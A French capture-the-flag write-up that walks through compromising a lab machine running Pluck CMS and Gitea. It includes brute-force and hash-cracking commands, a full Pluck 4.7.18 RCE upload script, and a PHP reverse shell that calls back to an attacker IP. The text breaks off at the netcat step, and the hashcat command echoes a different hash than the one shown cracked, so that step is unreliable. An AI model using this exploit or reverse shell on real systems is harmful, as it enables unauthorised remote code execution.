Tout d'abord on commence par un scan.
```bash
nmap -sV -v 10.10.11.25
```

On voit qu'ils y a 3 ports d'ouverts:
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
3000/tcp open  ppp?
```

Si on accède le site web au port 80, on se rend compte qu'il s'agit du CMS Pluck:
```bash
 admin | powered by pluck 
```

Si on accède au port 3000, on se rend compte qu'il s'agit d'une instance de Gitea:
```bash
Powered by Gitea Version: 1.21.11
```

On scanne les répertoires pour pluck et gitea, mais rien de bien intéressant:
```bash
dirb http://greenhorn.htb/
dirb http://10.10.11.25:3000/
```

En accédant à la page de login de pluck, on se rend compte qu'il s'agit de la version 4.7.18:
```bash
http://greenhorn.htb/login.php
```
On voit aussi qu'il y a champ pour le mot de passe, pas de username.

En utilisant burp, on essaye un mot de passe bidon et on intercepte la requête:
```bash
POST /login.php HTTP/1.1
Host: greenhorn.htb
Content-Length: 31
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://greenhorn.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://greenhorn.htb/login.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=8pr8gvim4vq20s4mvbgaaknhet
Connection: close

cont1=test&bogus=&submit=Log+in
```
On voit que le champ pour le mot de passe se nomme `cont1` et il semble y avoir un champ bogus qui est envoyé aussi pour prévenir le bruteforce.

Une fois ces informations en mains, on essaye de cracker le login avec hydra et rockyou.txt:
```bash
hydra -v -V -d -l username -P /home/kali/rockyou.txt -t 16 -m "/login.php:cont1=^PASS^&bogus=&submit=Log+in:F=incorrect" http-post-form://greenhorn.htb 
```

Cependant, on se rend vite compte qu'il y a une protection contre le bruteforce
```bash
You have exceeded the number of login attempts. Please wait 5 minutes before logging in again.
```

Ayant épuisé les pistes pour pluck pour le moment, on tourne notre attention vers gitea.
En fouillant un peu, on trouve un répertoire qui semble héberger le code source pour pluck:
```bash
http://10.10.11.25:3000/GreenAdmin/GreenHorn
```

En poussant la recherche plus loin, on trouve 2 fichiers intéressants, token.php et pass.php:
```php
http://10.10.11.25:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/token.php
<?php $token = '65c1e5cf86b4d727962672211b91924b828a0c05ece3954c75e3befa6b361fa3eb28c407f7101bc4eae2c604c96c641575c7fe82dbdc6ce0cf7d4a006f53bac7'; ?>
```
```php
http://10.10.11.25:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/pass.php
<?php
$ww = 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163';
?>
```

On réalise vite que pass.php contient un hash sha-512.
On tente donc de le décoder avec hashcat et rockyou.txt
```bash
echo "65c1e5cf86b4d727962672211b91924b828a0c05ece3954c75e3befa6b361fa3eb28c407f7101bc4eae2c604c96c641575c7fe82dbdc6ce0cf7d4a006f53bac7" > hash.txt
hashcat -m 1700 -a 0 hash.txt /home/kali/rockyou.txt
```

Une fois décodé, on obtient le mot de passe `iloveyou1`:
```bash
Dictionary cache hit:
* Filename..: /home/kali/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163:iloveyou1
```

Avec ce mot de passe, on est capable d'accéder à l'admin panel de pluck
```bash
http://greenhorn.htb/admin.php?action=start
```

L'accès à l'admin panel est confirmé. 
En fouillant un peu sur `exploit-db.com` on trouve le RCE suivant:
[upload-reverse-shell.py](https://www.exploit-db.com/exploits/51592)
```python
#Exploit Title: Pluck v4.7.18 - Remote Code Execution (RCE)
#Application: pluck
#Version: 4.7.18
#Bugs:  RCE
#Technology: PHP
#Vendor URL: https://github.com/pluck-cms/pluck
#Software Link: https://github.com/pluck-cms/pluck
#Date of found: 10-07-2023
#Author: Mirabbas Ağalarov
#Tested on: Linux 


import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder

login_url = "http://greenhorn.htb/login.php"
upload_url = "http://greenhorn.htb/admin.php?action=installmodule"
headers = {"Referer": login_url,}
login_payload = {"cont1": "iloveyou1","bogus": "","submit": "Log in"}

file_path = "/home/kali/reverse-shell.zip"

multipart_data = MultipartEncoder(
    fields={
        "sendfile": ("reverse-shell.zip", open(file_path, "rb"), "application/zip"),
        "submit": "Upload"
    }
)

session = requests.Session()
login_response = session.post(login_url, headers=headers, data=login_payload)


if login_response.status_code == 200:
    print("Login account")

 
    upload_headers = {
        "Referer": upload_url,
        "Content-Type": multipart_data.content_type
    }
    upload_response = session.post(upload_url, headers=upload_headers, data=multipart_data)

    
    if upload_response.status_code == 200:
        print("ZIP file download.")
    else:
        print("ZIP file download error. Response code:", upload_response.status_code)
else:
    print("Login problem. response code:", login_response.status_code)


rce_url="http://localhost/pluck/data/modules/reverse-shell/reverse-shell.php"

rce=requests.get(rce_url)

print(rce.text)
```

Il ne reste plus qu'à créer le reverse-shell.zip avec le reverse-shell.php à l'intérieur pour être exécuté par le RCE:
reverse-shell.php
```php
<?php
$ip = '10.10.14.174'; // change this to your IP address
$port = 4444; // change this to your listening port
$socket = fsockopen($ip, $port);
if ($socket) {
    $shell = 'uname -a; w; id; /bin/sh -i';
    fwrite($socket, $shell);
    while (!feof($socket)) {
        $command = fgets($socket);
        $output = '';
        if ($command) {
            $output = shell_exec($command);
            fwrite($socket, $output);
        }
    }
    fclose($socket);
}
?>
```

Puis, on lance netcat pour
